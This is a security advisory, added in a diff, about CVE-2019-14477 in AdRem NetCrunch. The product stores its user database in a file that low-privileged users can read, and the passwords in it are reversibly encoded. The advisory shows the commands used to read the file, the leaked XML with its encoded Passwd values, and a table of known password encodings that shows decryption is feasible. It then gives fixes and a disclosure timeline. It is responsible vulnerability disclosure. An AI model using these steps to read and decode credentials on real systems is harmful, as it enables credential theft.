@@ -1,0 +1,124 @@
+################################################################################
+#
+# COMPASS SECURITY ADVISORY
+# https://compass-security.com/en/research/advisories
+#
+################################################################################
+#
+# Product:  NetCrunch
+# Vendor:   AdRem
+# CSNC ID:  CSNC-2019-012
+# CVE ID:   CVE-2019-14477
+# Subject:  Improper Credential Storage
+# Risk:     High
+# Effect:   Locally exploitable
+# Authors:  Fabio Poloni <fabio.poloni@compass-security.com>
+#           Thierry Viaccoz <thierry.viaccoz@compass-security.com>
+#           Sylvain Heiniger <sylvain.heiniger@compass-security.com>
+# Date:     26.07.2019
+#
+################################################################################
+
+Introduction:
+-------------
+NetCrunch [1] is a so-called "agentless" monitoring solution developed by 
+AdRem. It allows system administrators to monitor, visualize and get alerts 
+from many kinds of systems in their network. The solution consists of a server 
+and a fat client (also called console), as well as a web client.
+
+Due to its architecture, the monitoring server is a critical system as it 
+holds credentials, most of the time privileged, for all monitored system.
+
+Compass Security identified an Improper Credential Storage since the internal 
+user database is readable by low-privileged users and passwords in the 
+database are weakly encoded or encrypted.
+
+Affected:
+---------
+Initially vulnerable:
+ * AdRem NetCrunch 10.6.0.4587
+
+Not vulnerable:
+ * AdRem NetCrunch 11.0.0.5282 (permissions on file fixed)
+
+Still vulnerable:
+ * AdRem NetCrunch 11.0.0.5282 (passwords still weakly encoded)
+
+No other version was tested, but it is believed that older versions are also 
+vulnerable.
+
+Technical Description:
+----------------------
+NetCrunch's internal user database is stored in UserProfiles.xml. However,
+every user of the system has read-access to it:
+
+    C:\>icacls C:\ProgramData\AdRem\NetCrunch\data\UserProfiles.xml
+    C:\ProgramData\AdRem\NetCrunch\data\UserProfiles.xml NT AUTHORITY\SYSTEM:(I)(F)
+                                                         BUILTIN\Administrators:(I)(F)
+                                                         BUILTIN\Users:(I)(RX)
+
+    Successfully processed 1 files; Failed processing 0 files
+
+To prove this, we created a low-privileged user called "compass":
+
+    C:\>net user /add compass *
+    Type a password for the user:
+    Retype the password to confirm:
+    The command completed successfully.
+
+Then we used this user to retrieve the content of the database:
+
+    C:\>runas /profile /user:compass /savecred "cmd /k type C:\ProgramData\AdRem\NetCrunch\data\UserProfiles.xml"
+    Attempting to start cmd /k type C:\ProgramData\AdRem\NetCrunch\data\UserProfiles.xml as user "SOME-SERVER\compass" ...
+
+    <?xml version="1.0" encoding="UTF-8"?>
+    <UserProfilesData lastUserId="1001"><Profiles><Profile Id="1" ReadOnly="True"><User Name="Admin" ACProfileId="0" MustChangePassword="False" PasswordChangeDate="43696.4332903009" orgId="0" Passwd="9bQCDuqO2ObAz2fM+"/><Notifications/><ApiKeys/></Profile><Profile Id="-2" ReadOnly="True" Hidden="True"><User Name="RemoteProbe" MustChangePassword="True" NoProfileAccess="True" ACProfileId="0V1g+" orgId="0"/><Notifications/><ApiKeys/></Profile><Profile Id="1001"><User Name="test" ACProfileId="-SU++" MustChangePassword="False" ActiveDirectoryUser="False" orgId="0" NoProfileAccess="False" PasswordChangeDate="43696.4404425347" Passwd="6EN3d4safimM+"/><Notifications/><ApiKeys/></Profile></Profiles></UserProfilesData>
+
+After investigating the "Passwd" attribute with different passwords, it is 
+obvious that the passwords are not hashes but encoded or encrypted:
+
+    password   -> 6mcuPTptWK1M+
+    password0  -> 7mcuPTptWK1Nm
+    password1  -> 7mcuPTptWK1Nn
+    password2  -> 7mcuPTptWK1Nk
+    password3  -> 7mcuPTptWK1Nl
+    password4  -> 7mcuPTptWK1Nq
+    password5  -> 7mcuPTptWK1Nr
+    password10 -> 8mcuPTptWK1NnZk++
+    password11 -> 8mcuPTptWK1NnZU++
+    password12 -> 8mcuPTptWK1NnZE++
+    password13 -> 8mcuPTptWK1NnZ+++
+    password14 -> 8mcuPTptWK1NnYk++
+    000000     -> 4H4Mz55Z6
+    100000     -> 4HKMz55Z6
+    200000     -> 4HaMz55Z6
+    0000000    -> 5H4Mz55Z68k++
+    00000000   -> 6pprBUg3IQNY+
+    000000000  -> 7pprBUg3IQNaI
+
+It is therefore possible to decode or decrypt the "Passwd" attribute in order 
+to find the original password with the NetCrunch application acting as a 
+decryption oracle.
+
+Workaround / Fix:
+-----------------
+Fix the permissions in order to prevent low-privileged users on the system 
+from reading the user database.
+
+Additionally, use an adequate algorithm for hashing passwords, such as PBKDF2, 
+bcrypt or scrypt. Password hashes should always be stored with a strong salt 
+that is unique per user.
+
+As a NetCrunch customer, update your installation to the latest version to 
+receive the fix.
+
+Timeline:
+---------
+2019-05-23: Discovery by Fabio Poloni, Thierry Viaccoz and Sylvain Heiniger
+2019-08-01: Assigned CVE-2019-14477
+2019-08-29: Initial vendor notification
+2020-12-08: Coordinated public disclosure date
+
+References:
+-----------
+[1] https://www.adremsoft.com/
